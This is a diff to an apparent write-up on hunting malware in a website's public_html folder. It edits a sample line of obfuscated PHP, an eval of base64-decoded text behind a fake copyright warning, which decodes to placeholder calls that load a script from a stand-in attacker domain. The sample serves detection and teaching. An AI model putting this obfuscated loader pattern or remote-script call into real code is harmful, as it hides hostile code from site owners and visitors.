@@ -54,7 +54,7 @@ Searching for our three key strings in public_html/ turned up the culprit: ./pub
 
  // This file is encoded for copyright protection.
  // Don't decode it or I'll sue you.
- eval(base64_decode(Ly8gSGFoYSB0aGV5J2xsIG5ldmVyIGZpbmQgbWUhCmhhY2tpbmdNYWluZnJhbWUoKTsKaW5qZWN0aW5nQ29kZSgpOwpicm93c2VyVGFrZW92ZXIoJ2h0dHA6Ly9ldmlsZG9tYWluLmNvbS9tYWx3YXJlLmpzJyk7));
+ eval(base64_decode("Ly8gSGFoYSB0aGV5J2xsIG5ldmVyIGZpbmQgbWUhCmhhY2tpbmdNYWluZnJhbWUoKTsKaW5qZWN0aW5nQ29kZSgpOwpicm93c2VyVGFrZW92ZXIoJ2h0dHA6Ly9ldmlsZG9tYWluLmNvbS9tYWx3YXJlLmpzJyk7"));
 ```
 
 As we can see, the string "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" was identified in the file.
